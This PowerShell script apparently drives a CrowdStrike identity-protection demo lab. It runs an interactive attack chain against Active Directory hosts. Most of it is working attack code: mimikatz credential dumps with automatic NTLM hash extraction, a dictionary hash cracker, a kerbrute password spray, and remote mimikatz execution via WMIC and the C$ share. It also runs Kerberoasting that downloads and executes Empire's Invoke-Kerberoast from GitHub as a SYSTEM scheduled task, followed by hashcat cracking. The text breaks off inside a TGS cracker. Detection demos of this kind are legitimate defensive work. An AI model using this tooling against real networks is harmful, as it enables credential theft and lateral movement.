# ============================================================
#  Identity Attack Menu - Unmanaged Workstation
#  CrowdStrike NGSIEM + Identity Protection Demo
#  Version: 5.2 (2026-04-03)
#
#  Attack narrative:
#    1. Phishing campaign (narrative)
#    2. Fortinet CVE exploitation + brute force to unmanaged (narrative)
#    3. Recon + credential dump on UNMANAGED host (active)
#    4. Crack demo hash + kerbrute spray (active)
#    5. Remote dump on DT via WinRM (active - dead end, no DA)
#    6. Kerberoast on DT + crack TGS hash (active - triggers IDP)
#    7. Lateral movement to Ubuntu - cloud detections (active)
# ============================================================

# --- Environment Variables (set these in cmd BEFORE running) ---
# set ENV_DOMAIN=<your-ad-domain>
# set ENV_DC_IP=<DC IP address>
# set ENV_DT=<DT IP address>
# set ENV_UBUNTU=<Ubuntu server IP>

$ErrorActionPreference = "Continue"
$idpDir = "C:\IDP_Files"
$mimiExe = "$idpDir\Mimikatz\x64\mimikatz.exe"
$wordlistFile = "$idpDir\wordlist.txt"

# --- Load saved IP overrides (persisted across launches) ---
$ipConfigFile = "$idpDir\ip_config.txt"
if (Test-Path $ipConfigFile) {
    Write-Host "[*] Loading saved config from $ipConfigFile" -ForegroundColor Gray
    Get-Content $ipConfigFile | ForEach-Object {
        if ($_ -match '^(\w+)=(.+)$') {
            Set-Item -Path "env:$($Matches[1])" -Value $Matches[2]
        }
    }
}

# --- Debug: show what env vars are set ---
Write-Host "[*] Env check: DOMAIN=$env:ENV_DOMAIN DC=$env:ENV_DC_IP DT=$env:ENV_DT UBUNTU=$env:ENV_UBUNTU" -ForegroundColor DarkGray

# --- Validate env vars on startup ---
$missing = @()
if (-not $env:ENV_DOMAIN)    { $missing += "ENV_DOMAIN" }
if (-not $env:ENV_DC_IP)     { $missing += "ENV_DC_IP" }
if (-not $env:ENV_DT)        { $missing += "ENV_DT" }
if (-not $env:ENV_UBUNTU)    { $missing += "ENV_UBUNTU" }
if ($missing.Count -gt 0) {
    Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
    Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
    Write-Host '    set ENV_DOMAIN=lab.yourdomain.com' -ForegroundColor Gray
    Write-Host '    set ENV_DC_IP=<DC IP>' -ForegroundColor Gray
    Write-Host '    set ENV_DT=<DT IP>' -ForegroundColor Gray
    Write-Host '    set ENV_UBUNTU=<Ubuntu IP>' -ForegroundColor Gray
    pause
    exit 1
}
# Default FortiGate IP (simulated)
if (-not $env:ENV_FORTI_IP) { $env:ENV_FORTI_IP = "10.200.99.1" }

# --- Validate IPs ---
$ipPattern = '^\d+\.\d+\.\d+\.\d+$'
$needSave = $false
foreach ($varName in @("ENV_DC_IP", "ENV_DT", "ENV_UBUNTU")) {
    $val = [Environment]::GetEnvironmentVariable($varName)
    if ($val -and $val -notmatch $ipPattern) {
        Write-Host "[!] $varName is set to hostname: $val (need IP address)" -ForegroundColor Red
        $newVal = Read-Host "    Enter IP for $varName"
        if ($newVal -match $ipPattern) {
            Set-Item -Path "env:$varName" -Value $newVal
            Write-Host "    [+] $varName = $newVal" -ForegroundColor Green
            $needSave = $true
        } else {
            Write-Host "    [!] Invalid IP. Exiting." -ForegroundColor Red
            pause; exit 1
        }
    }
}
if ($needSave) {
    @("ENV_DC_IP=$env:ENV_DC_IP", "ENV_DT=$env:ENV_DT", "ENV_UBUNTU=$env:ENV_UBUNTU", "ENV_DOMAIN=$env:ENV_DOMAIN", "ENV_FORTI_IP=$env:ENV_FORTI_IP") | Out-File -FilePath $ipConfigFile -Encoding ASCII
    Write-Host "[+] IPs saved to $ipConfigFile (won't ask again)" -ForegroundColor Green
}

# Hash files (live extraction, never hardcoded)
$clarkHashFile = "$idpDir\clark_hash.txt"
$demoHashFile = "$idpDir\demo_hash.txt"

function Get-ClarkHash {
    if (Test-Path $clarkHashFile) { return (Get-Content $clarkHashFile -First 1).Trim() }
    Write-Host "[!] No clark.monroe hash found. Run Step 3 or 6 first." -ForegroundColor Red
    return $null
}
function Get-DemoHash {
    if (Test-Path $demoHashFile) { return (Get-Content $demoHashFile -First 1).Trim() }
    Write-Host "[!] No demo hash found. Run Step 3 first." -ForegroundColor Red
    return $null
}

# --- Helper: narrative banner ---
function Show-StepBanner {
    param([string]$Step, [string]$Title, [string[]]$Lines, [string]$Detection = "")
    Clear-Host
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor Cyan
    Write-Host "  STEP $Step : $Title" -ForegroundColor Cyan
    Write-Host "  ================================================================" -ForegroundColor Cyan
    Write-Host ""
    foreach ($line in $Lines) { Write-Host "  $line" -ForegroundColor White }
    if ($Detection) {
        Write-Host ""
        Write-Host "  Detections: $Detection" -ForegroundColor Yellow
    }
    Write-Host ""
}

$scriptVersion = "5.5"
Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
Start-Sleep -Seconds 2

function Show-Menu {
    Clear-Host
    Write-Host
    Write-Host "================ Identity Attack Demo - Unmanaged Host  [v$scriptVersion] ================" -ForegroundColor Cyan
    Write-Host
    Write-Host "  Story: phishing > Fortinet exploit > dump unmanaged > crack > remote dump DT > Kerberoast > cloud" -ForegroundColor DarkGray
    Write-Host
    Write-Host "  --- Narrative (logs from log generator) ---" -ForegroundColor Yellow
    Write-Host "  1: Phishing Campaign                       [Mimecast spearphishing]"
    Write-Host "  2: Fortinet Exploitation                   [CVE exploit + brute force to unmanaged]"
    Write-Host
    Write-Host "  --- Active (on this unmanaged host) ---" -ForegroundColor Yellow
    Write-Host "  3: Recon + Credential Dump (local)         [whoami, mimikatz SAM + logonpasswords]"
    Write-Host "  4: Crack Demo Hash + Kerbrute Spray        [NTLM offline crack + AD credential spray]"
    Write-Host
    Write-Host "  --- Lateral Movement (remote via WMIC+SMB) ---" -ForegroundColor Yellow
    Write-Host "  5: Remote Dump on DT                       [mimikatz via WMIC -> find cached DA hash]"
    Write-Host "  6: Kerberoast on DT + Crack TGS            [Invoke-Kerberoast -> IDP detection on DC]"
    Write-Host "  7: Lateral to Ubuntu (Cloud Detections)    [SSH -> Log4Shell + S3 scripts]"
    Write-Host
    Write-Host "  C: Configure IPs" -ForegroundColor DarkGray
    Write-Host "  P: Prep Lab (enable demo on DT + cache DA creds)" -ForegroundColor DarkGray
    Write-Host "  Q: Quit" -ForegroundColor Red
    Write-Host
}

do {
    Show-Menu
    $selection = Read-Host "Select step"
    switch ($selection) {

        # ================================================================
        # STEP 1: PHISHING CAMPAIGN (Narrative)
        # ================================================================
        '1' {
            Show-StepBanner -Step "1" -Title "INITIAL PHISHING CAMPAIGN" -Lines @(
                "The attacker launches spearphishing emails targeting"
                "multiple employees at the organization."
                ""
                "  - .xlsm macro spreadsheet (delivered)"
                "  - .html credential harvester (delivered)"
                "  - .zip archive with payload (blocked by Mimecast)"
                ""
                ">> These logs come from the log generator (Mimecast samples)"
            ) -Detection "Mimecast: email receipt, delivery vs block, suspicious attachments"

            Write-Host "  What to look for in NGSIEM:" -ForegroundColor Cyan
            Write-Host "  - Mimecast events: Rcpt, Process, Delivery" -ForegroundColor White
            Write-Host "  - Blocked vs delivered emails" -ForegroundColor White
            Write-Host "  - Suspicious attachment types (.xlsm, .html)" -ForegroundColor White
            Write-Host
            Write-Host "  [*] Next: Step 2 (Fortinet exploitation)" -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 2: FORTINET EXPLOITATION (Narrative)
        # ================================================================
        '2' {
            Show-StepBanner -Step "2" -Title "FORTINET EXPLOITATION + ACCESS TO UNMANAGED" -Lines @(
                "The attacker exploits CVEs on the FortiGate at $($env:ENV_FORTI_IP):"
                ""
                "  1. CVE-2024-55591: jsconsole authentication bypass"
                "  2. CVE-2023-27997: SSL-VPN heap overflow"
                "  3. Create short-lived backdoor admin: svc_backup"
                "  4. Establish VPN tunnel into internal network"
                "  5. Brute force/discovery against this unmanaged host"
                "  6. Attacker gains access to unmanaged workstation"
                ""
                ">> FortiGate logs come from the log generator"
                ">> (CVE exploit, admin creation, brute force IPS signatures)"
            ) -Detection "FortiGate: CVE exploit, admin creation/deletion, IPS brute force, VPN tunnel"

            Write-Host "  What to look for in NGSIEM:" -ForegroundColor Cyan
            Write-Host "  - FortiGate admin login anomalies (jsconsole)" -ForegroundColor White
            Write-Host "  - Rapid admin creation then deletion (svc_backup)" -ForegroundColor White
            Write-Host "  - IPS brute force signature against unmanaged host" -ForegroundColor White
            Write-Host "  - VPN tunnel from external IP" -ForegroundColor White
            Write-Host
            Write-Host "  [*] Attacker now has access to this unmanaged host." -ForegroundColor Yellow
            Write-Host "  [*] Next: Step 3 (dump credentials on unmanaged)" -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 3: RECON + CREDENTIAL DUMP ON UNMANAGED (Active)
        # ================================================================
        '3' {
            Show-StepBanner -Step "3" -Title "RECON + CREDENTIAL DUMP ON UNMANAGED" -Lines @(
                "The attacker performs local recon and dumps credentials"
                "on this unmanaged workstation (no CrowdStrike sensor)."
                ""
                "Key finding: the 'demo' local admin account exists here"
                "AND on the managed DT machine (shared local admin password)."
            ) -Detection "None (unmanaged host - no sensor)"

            # --- Recon ---
            Write-Host "--- System Info ---" -ForegroundColor Yellow
            Write-Host "  Hostname : $env:COMPUTERNAME" -ForegroundColor White
            Write-Host "  OS       : $((Get-CimInstance Win32_OperatingSystem).Caption)" -ForegroundColor White
            Write-Host "  Domain   : $((Get-CimInstance Win32_ComputerSystem).Domain)" -ForegroundColor White
            Write-Host "  Joined   : $((Get-CimInstance Win32_ComputerSystem).PartOfDomain)" -ForegroundColor White
            Write-Host

            Write-Host "--- Local Admins ---" -ForegroundColor Yellow
            net localgroup Administrators
            Write-Host

            Write-Host "--- Local Accounts ---" -ForegroundColor Yellow
            net user
            Write-Host

            # --- Mimikatz dump ---
            Write-Host "--- Mimikatz Credential Dump ---" -ForegroundColor Yellow
            & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step3_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"

            Write-Host "`n[+] Output saved to: $idpDir\step3_cred_dump.log" -ForegroundColor Green

            # Auto-extract hashes
            $dumpLog = "$idpDir\step3_cred_dump.log"
            if (Test-Path $dumpLog) {
                $logContent = Get-Content $dumpLog -Raw

                # Extract demo hash (SAM)
                if ($logContent -match "User\s*:\s*demo[\s\S]*?Hash NTLM\s*:\s*([0-9a-fA-F]{32})") {
                    $extractedDemo = $Matches[1].ToLower()
                    $extractedDemo | Out-File -FilePath $demoHashFile -Encoding ASCII
                    Write-Host "[+] demo NTLM extracted: $extractedDemo" -ForegroundColor Green
                } else {
                    Write-Host "[!] Could not auto-extract demo hash." -ForegroundColor Yellow
                    $manualDemoHash = Read-Host "  Enter demo NTLM hash manually"
                    if ($manualDemoHash -and $manualDemoHash.Length -eq 32) {
                        $manualDemoHash | Out-File -FilePath $demoHashFile -Encoding ASCII
                        Write-Host "[+] Demo hash saved." -ForegroundColor Green
                    }
                }

                # Extract clark.monroe hash if present (from logonpasswords)
                if ($logContent -match "clark\.monroe[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {
                    $extractedClark = $Matches[1].ToLower()
                    $extractedClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
                    Write-Host "[+] clark.monroe NTLM extracted: $extractedClark" -ForegroundColor Green
                }
            }

            Write-Host
            Write-Host "[*] demo hash is the key: same password on DT (shared local admin)." -ForegroundColor Cyan
            Write-Host "[*] Next: Step 4 (crack demo hash) then Step 5 (RDP to DT)." -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 4: CRACK DEMO HASH + KERBRUTE SPRAY (Active)
        # ================================================================
        '4' {
            Show-StepBanner -Step "4" -Title "CRACK DEMO HASH + KERBRUTE SPRAY" -Lines @(
                "Offline dictionary attack against the demo NTLM hash,"
                "then spray the cracked password against all AD users."
            ) -Detection "CrowdStrike IDP: CredentialScanningActiveDirectory"

            # --- 4a: Crack ---
            Write-Host "--- 4a: NTLM Hash Cracking ---" -ForegroundColor Yellow
            Write-Host

            $demoHash = Get-DemoHash
            if (-not $demoHash -or $demoHash.Length -ne 32) {
                Write-Host "  [!] No valid demo hash. Run Step 3 first." -ForegroundColor Red
                break
            }
            Write-Host "  [*] Target hash: $demoHash" -ForegroundColor White

            if (Test-Path $wordlistFile) {
                $wordlist = Get-Content $wordlistFile | Where-Object { $_.Trim() -ne "" }
                Write-Host "  [*] Loaded $($wordlist.Count) passwords from $wordlistFile" -ForegroundColor Gray
            } else {
                Write-Host "  [!] No wordlist.txt found at $wordlistFile" -ForegroundColor Red
                break
            }

            # MD4 via Windows CryptoAPI
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class CryptoMD4 {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr hHash);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptGetHashParam(IntPtr hHash, uint dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptDestroyHash(IntPtr hHash);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
    public static string ComputeMD4(byte[] data) {
        IntPtr hProv = IntPtr.Zero; IntPtr hHash = IntPtr.Zero;
        CryptAcquireContext(ref hProv, null, null, 1, 0xF0000000);
        CryptCreateHash(hProv, 0x8002, IntPtr.Zero, 0, ref hHash);
        CryptHashData(hHash, data, (uint)data.Length, 0);
        byte[] hash = new byte[16]; uint len = 16;
        CryptGetHashParam(hHash, 2, hash, ref len, 0);
        CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0);
        return BitConverter.ToString(hash).Replace("-","").ToLower();
    }
}
"@ -ErrorAction SilentlyContinue

            $crackedPw = $null
            $attempts = 0
            $startTime = Get-Date
            foreach ($pw in $wordlist) {
                $attempts++
                try {
                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($pw)
                    $computed = [CryptoMD4]::ComputeMD4($bytes)
                    if ($computed -eq $demoHash) {
                        $elapsed = ((Get-Date) - $startTime).TotalSeconds
                        Write-Host "  [+] CRACKED! Password: $pw" -ForegroundColor Green
                        Write-Host "  [+] Attempts: $attempts | Time: $([math]::Round($elapsed,2))s" -ForegroundColor Green
                        $crackedPw = $pw
                        $crackedPw | Out-File -FilePath "$idpDir\demo_password.txt" -Encoding ASCII
                        Write-Host "  [+] Password saved to $idpDir\demo_password.txt" -ForegroundColor Green
                        break
                    }
                } catch { }
                if ($attempts % 10 -eq 0) { Write-Host "  [*] Tried $attempts passwords..." -ForegroundColor DarkGray }
            }
            if (-not $crackedPw) {
                Write-Host "  [-] Exhausted wordlist ($attempts passwords)." -ForegroundColor Yellow
            }

            # --- 4b: Kerbrute spray ---
            Write-Host
            Write-Host "--- 4b: Kerbrute Password Spray ---" -ForegroundColor Yellow
            Write-Host

            $userFile = "$idpDir\ldap_users.txt"
            if (-not (Test-Path $userFile)) { $userFile = "$idpDir\users.txt" }
            Write-Host "  DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray

            if ($crackedPw) {
                Write-Host "  [+] Using cracked password: $crackedPw" -ForegroundColor Green
                $sprayPw = $crackedPw
            } else {
                $sprayPw = Read-Host "  Enter password to spray (or Enter to skip)"
            }

            if ($sprayPw) {
                Write-Host "  [*] Spraying against all users..." -ForegroundColor White
                Write-Host "  [*] Triggers CredentialScanningActiveDirectory" -ForegroundColor Yellow
                Write-Host

                $kerbrute = "$idpDir\kerbrute.exe"
                if (-not (Test-Path $kerbrute)) { $kerbrute = "$idpDir\kerbrute_windows_amd64.exe" }
                if (Test-Path $kerbrute) {
                    try {
                        $proc = Start-Process -FilePath $kerbrute `
                            -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $sprayPw" `
                            -NoNewWindow -Wait -PassThru
                        Write-Host "`n  [+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
                    } catch { Write-Host "  [!] Kerbrute error: $_" -ForegroundColor Red }
                } else {
                    Write-Host "  [!] kerbrute not found at $idpDir" -ForegroundColor Red
                }
            }

            Write-Host
            Write-Host "[*] Next: Step 5 (RDP to DT with demo account)." -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 5: REMOTE DUMP ON DT VIA WMIC+SMB (Active)
        # ================================================================
        '5' {
            Show-StepBanner -Step "5" -Title "REMOTE CREDENTIAL DUMP ON DT" -Lines @(
                "The attacker uses the cracked demo password to remotely"
                "execute mimikatz on DT via WMIC (no WinRM needed)."
                ""
                "WMIC uses DCOM/RPC - works with just local admin access."
                "Output is retrieved via SMB admin share (\\DT\C$)."
                ""
                "DT has CrowdStrike Falcon in DETECT mode - triggers detections."
                "Expected result: only local accounts - no domain admin."
            ) -Detection "CrowdStrike: LSASS access, credential dump on managed host"

            # --- Load credential ---
            $demoPw = $null
            if (Test-Path "$idpDir\demo_password.txt") {
                $demoPw = (Get-Content "$idpDir\demo_password.txt" -First 1).Trim()
            } else {
                $demoPw = Read-Host "  Enter demo password (run Step 4 first)"
            }
            if (-not $demoPw) {
                Write-Host "  [!] No demo password available. Run Step 4 first." -ForegroundColor Red
                break
            }

            Write-Host "  [+] Credential: $env:ENV_DT\demo / $demoPw" -ForegroundColor Green
            Write-Host "  [*] Target: $env:ENV_DT" -ForegroundColor White
            Write-Host

            # --- Map SMB admin share ---
            $dtShare = "\\$env:ENV_DT\C$"
            $dtIdpRemote = "$dtShare\IDP_Files"
            Write-Host "  [*] Connecting to $dtShare ..." -ForegroundColor White
            net use $dtShare /user:$env:ENV_DT\demo $demoPw /persistent:no 2>$null | Out-Null
            if (-not (Test-Path $dtIdpRemote)) {
                Write-Host "  [!] Cannot access $dtIdpRemote - check admin share access." -ForegroundColor Red
                break
            }
            Write-Host "  [+] SMB connected to $dtShare" -ForegroundColor Green
            Write-Host

            # --- Check mimikatz on DT ---
            $dtMimiExe = "$dtIdpRemote\Mimikatz\x64\mimikatz.exe"
            if (-not (Test-Path $dtMimiExe)) {
                Write-Host "  [!] mimikatz.exe not found on DT at C:\IDP_Files\Mimikatz\x64\" -ForegroundColor Red
                Write-Host "  [*] Run Prep_Unmanaged.ps1 on DT first." -ForegroundColor Yellow
                break
            }
            Write-Host "  [+] mimikatz.exe found on DT" -ForegroundColor Green

            # --- Write batch file to DT ---
            $dtDumpLog = "C:\IDP_Files\dt_dump.log"
            $batContent = @(
                '@echo off'
                'C:\IDP_Files\Mimikatz\x64\mimikatz.exe "privilege::debug" "token::elevate" "log C:\IDP_Files\dt_dump.log" "lsadump::sam" "sekurlsa::logonpasswords" "exit"'
            ) -join "`r`n"
            $batContent | Out-File -FilePath "$dtIdpRemote\run_dump.bat" -Encoding ASCII
            Write-Host "  [+] Batch file written to \\$env:ENV_DT\C$\IDP_Files\run_dump.bat" -ForegroundColor Green

            # --- Clean previous dump ---
            if (Test-Path "$dtIdpRemote\dt_dump.log") { Remove-Item "$dtIdpRemote\dt_dump.log" -Force }

            # --- Execute via WMIC ---
            Write-Host "  [*] Executing mimikatz on DT via WMIC..." -ForegroundColor White
            $wmicCmd = "wmic /node:$env:ENV_DT /user:$env:ENV_DT\demo /password:$demoPw process call create `"cmd.exe /c C:\IDP_Files\run_dump.bat`""
            cmd.exe /c $wmicCmd 2>&1 | Out-Null
            Write-Host "  [*] WMIC process launched. Waiting for dump..." -ForegroundColor White

            # --- Wait for output (force SMB cache refresh) ---
            $maxWait = 30
            $waited = 0
            $dumpFound = $false
            while ($waited -lt $maxWait) {
                Start-Sleep -Seconds 3
                $waited += 3
                # Force SMB directory refresh to bust cache
                $dirCheck = cmd.exe /c "dir `"$dtIdpRemote\dt_dump.log`" 2>nul" | Out-String
                if ($dirCheck -match "dt_dump\.log") {
                    $dumpFound = $true
                    # Give mimikatz a moment to finish writing
                    Start-Sleep -Seconds 2
                    break
                }
                Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
            }

            # --- Retrieve and display ---
            if ($dumpFound -or (Test-Path "$dtIdpRemote\dt_dump.log")) {
                $dumpContent = Get-Content "$dtIdpRemote\dt_dump.log" -Raw -ErrorAction SilentlyContinue
                if (-not $dumpContent) {
                    # Fallback: read via cmd to bypass PS caching
                    $dumpContent = cmd.exe /c "type `"$dtIdpRemote\dt_dump.log`"" | Out-String
                }
                Write-Host
                Write-Host "  === DT Credential Dump ===" -ForegroundColor Yellow
                Write-Host $dumpContent -ForegroundColor Gray
                Write-Host

                # Save locally
                $dumpContent | Out-File -FilePath "$idpDir\dt_dump_remote.log" -Encoding ASCII
                Write-Host "  [+] Dump saved locally: $idpDir\dt_dump_remote.log" -ForegroundColor Green

                if ($dumpContent -match "clark\.monroe|svc_runbook") {
                    Write-Host "  [!] Interesting domain account found!" -ForegroundColor Green
                } else {
                    Write-Host "  [-] Only local accounts found - no domain admin cached." -ForegroundColor Yellow
                    Write-Host "  [-] Dead end. Next: Step 6 - Kerberoast." -ForegroundColor Red
                }
            } else {
                Write-Host "  [!] Dump log not found after ${maxWait}s. Check DT manually." -ForegroundColor Red
            }

            # Cleanup batch
            Remove-Item "$dtIdpRemote\run_dump.bat" -Force -ErrorAction SilentlyContinue
            net use $dtShare /delete /y 2>$null | Out-Null
            Write-Host
        }

        # ================================================================
        # STEP 6: KERBEROAST ON DT + CRACK TGS (Active - WMIC+SMB)
        # ================================================================
        '6' {
            Show-StepBanner -Step "6" -Title "KERBEROAST ON DT + CRACK TGS HASH" -Lines @(
                "Local dump on DT was a dead end - no domain admin."
                "The attacker pivots to KERBEROASTING."
                ""
                "Kerberoasting requests TGS tickets for service accounts"
                "with SPNs in Active Directory. The ticket is encrypted"
                "with the service account password hash - crackable offline."
                ""
                "Executed remotely on DT via scheduled task (SYSTEM)."
                "CrowdStrike IDP detects this pattern on the DC."
            ) -Detection "CrowdStrike IDP: Kerberoasting / SuspiciousKerberosTicketRequest"

            # --- Load credential ---
            $demoPw = $null
            if (Test-Path "$idpDir\demo_password.txt") {
                $demoPw = (Get-Content "$idpDir\demo_password.txt" -First 1).Trim()
            } else {
                $demoPw = Read-Host "  Enter demo password (run Step 4 first)"
            }
            if (-not $demoPw) {
                Write-Host "  [!] No demo password available. Run Step 4 first." -ForegroundColor Red
                break
            }

            Write-Host "  [+] Credential: $env:ENV_DT\demo / $demoPw" -ForegroundColor Green
            Write-Host "  [*] Target: $env:ENV_DT" -ForegroundColor White
            Write-Host

            # --- Map SMB admin share ---
            $dtShare = "\\$env:ENV_DT\C$"
            $dtIdpRemote = "$dtShare\IDP_Files"
            Write-Host "  [*] Connecting to $dtShare ..." -ForegroundColor White
            net use $dtShare /user:$env:ENV_DT\demo $demoPw /persistent:no 2>$null | Out-Null
            if (-not (Test-Path $dtIdpRemote)) {
                Write-Host "  [!] Cannot access $dtIdpRemote - check admin share access." -ForegroundColor Red
                break
            }
            Write-Host "  [+] SMB connected" -ForegroundColor Green
            Write-Host

            # --- Write Kerberoast PS1 to DT ---
            $kerbScript = @'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$outFile = "C:\IDP_Files\kerberoast_output.txt"
$hashFile = "C:\IDP_Files\kerberoast_hashes.txt"
try {
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
    $results = Invoke-Kerberoast -OutputFormat Hashcat
    if ($results) {
        $results | Format-List | Out-File -FilePath $outFile -Encoding ASCII
        $results | Select-Object -ExpandProperty Hash | Out-File -FilePath $hashFile -Encoding ASCII
        Add-Content -Path $outFile -Value "`n[SUCCESS] Found $(@($results).Count) service account(s)"
    } else {
        "[NO_RESULTS] No SPN accounts found" | Out-File -FilePath $outFile -Encoding ASCII
    }
} catch {
    "[ERROR] $_" | Out-File -FilePath $outFile -Encoding ASCII
}
'@
            $kerbScript | Out-File -FilePath "$dtIdpRemote\run_kerberoast.ps1" -Encoding ASCII
            Write-Host "  [+] Kerberoast script written to DT" -ForegroundColor Green

            # Clean previous output
            @("$dtIdpRemote\kerberoast_output.txt", "$dtIdpRemote\kerberoast_hashes.txt") | ForEach-Object {
                if (Test-Path $_) { Remove-Item $_ -Force }
            }

            # --- Execute via remote scheduled task as SYSTEM ---
            # SYSTEM on domain-joined DT authenticates to AD as the computer account
            Write-Host "  [*] Creating scheduled task on DT (runs as SYSTEM for domain access)..." -ForegroundColor White
            Write-Host "  [*] This triggers IDP detection on the DC." -ForegroundColor Yellow
            $taskName = "IDP_Kerberoast"
            $taskCmd = "powershell.exe -ep bypass -file C:\IDP_Files\run_kerberoast.ps1"

            # Delete any existing task
            schtasks /delete /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName /f 2>$null | Out-Null

            # Create task as SYSTEM
            $createResult = schtasks /create /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName /tr $taskCmd /sc once /st 00:00 /ru SYSTEM /f 2>&1
            if ($LASTEXITCODE -ne 0) {
                Write-Host "  [!] Failed to create scheduled task: $createResult" -ForegroundColor Red
                break
            }
            Write-Host "  [+] Task created. Running..." -ForegroundColor Green

            # Run the task
            schtasks /run /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName 2>&1 | Out-Null
            Write-Host "  [*] Task launched. Waiting for results..." -ForegroundColor White

            # --- Wait for output (force SMB cache refresh) ---
            $maxWait = 45
            $waited = 0
            $kerbFound = $false
            while ($waited -lt $maxWait) {
                Start-Sleep -Seconds 3
                $waited += 3
                $dirCheck = cmd.exe /c "dir `"$dtIdpRemote\kerberoast_output.txt`" 2>nul" | Out-String
                if ($dirCheck -match "kerberoast_output\.txt") {
                    $kerbFound = $true
                    Start-Sleep -Seconds 2
                    break
                }
                Write-Host "  [*] Waiting... ($waited s)" -ForegroundColor DarkGray
            }

            # --- Retrieve results ---
            if ($kerbFound -or (Test-Path "$dtIdpRemote\kerberoast_output.txt")) {
                $kerbOutput = Get-Content "$dtIdpRemote\kerberoast_output.txt" -Raw -ErrorAction SilentlyContinue
                if (-not $kerbOutput) {
                    $kerbOutput = cmd.exe /c "type `"$dtIdpRemote\kerberoast_output.txt`"" | Out-String
                }
                Write-Host
                Write-Host "  === Kerberoast Results ===" -ForegroundColor Yellow
                Write-Host $kerbOutput -ForegroundColor Gray
                Write-Host

                if ($kerbOutput -match "\[SUCCESS\]") {
                    Write-Host "  [+] Kerberoast SUCCESS!" -ForegroundColor Green

                    # Copy hashes locally
                    if (Test-Path "$dtIdpRemote\kerberoast_hashes.txt") {
                        Copy-Item "$dtIdpRemote\kerberoast_hashes.txt" "$idpDir\kerberoast_hashes.txt" -Force
                        Write-Host "  [+] TGS hashes copied to $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
                        Write-Host

                        # --- Crack TGS hash ---
                        Write-Host "  ===========================================" -ForegroundColor DarkGray
                        Write-Host "  Cracking TGS hash" -ForegroundColor Yellow
                        Write-Host "  ===========================================" -ForegroundColor DarkGray
                        Write-Host

                        # Check if hashcat is available
                        $hashcatPath = $null
                        # Search common locations
                        $hashcatSearchPaths = @(
                            "$idpDir\hashcat.exe"
                            "$idpDir\hashcat-6.2.6\hashcat.exe"
                        )
                        # Also check any hashcat-* subdirectory
                        Get-ChildItem -Path $idpDir -Directory -Filter "hashcat*" -ErrorAction SilentlyContinue | ForEach-Object {
                            $hashcatSearchPaths += "$($_.FullName)\hashcat.exe"
                        }
                        foreach ($hp in $hashcatSearchPaths) {
                            if (-not $hashcatPath -and (Test-Path $hp)) { $hashcatPath = $hp }
                        }
                        if (-not $hashcatPath -and (Get-Command "hashcat.exe" -ErrorAction SilentlyContinue)) { $hashcatPath = "hashcat.exe" }

                        if ($hashcatPath) {
                            Write-Host "  [+] hashcat found: $hashcatPath" -ForegroundColor Green
                            Write-Host "  [*] Cracking TGS with wordlist..." -ForegroundColor White
                            try {
                                $hashcatProc = Start-Process -FilePath $hashcatPath `
                                    -ArgumentList "-m 13100 `"$idpDir\kerberoast_hashes.txt`" `"$wordlistFile`" --force --potfile-disable -o `"$idpDir\kerberoast_cracked.txt`"" `
                                    -NoNewWindow -Wait -PassThru
                                if (Test-Path "$idpDir\kerberoast_cracked.txt") {
                                    $cracked = Get-Content "$idpDir\kerberoast_cracked.txt"
                                    Write-Host "  [+] CRACKED!" -ForegroundColor Green
                                    $cracked | ForEach-Object { Write-Host "  $_" -ForegroundColor Green }
                                } else {
                                    Write-Host "  [-] hashcat finished but no cracks (exit: $($hashcatProc.ExitCode))." -ForegroundColor Yellow
                                }
                            } catch {
                                Write-Host "  [!] hashcat error: $_" -ForegroundColor Red
                            }
                        } else {
                            # --- Pure PowerShell TGS cracker (etype 23 / RC4-HMAC) ---
                            Write-Host "  [-] hashcat not found. Using built-in PowerShell cracker..." -ForegroundColor Yellow
                            Write-Host

                            $hashLine = (Get-Content "$idpDir\kerberoast_hashes.txt" -First 1).Trim()
                            if ($hashLine -match '\$krb5tgs\$23\$\*[^*]+\*\$([A-Fa-f0-9]{32})\$([A-Fa-f0-9]+)') {
                                $checksumHex = $Matches[1]
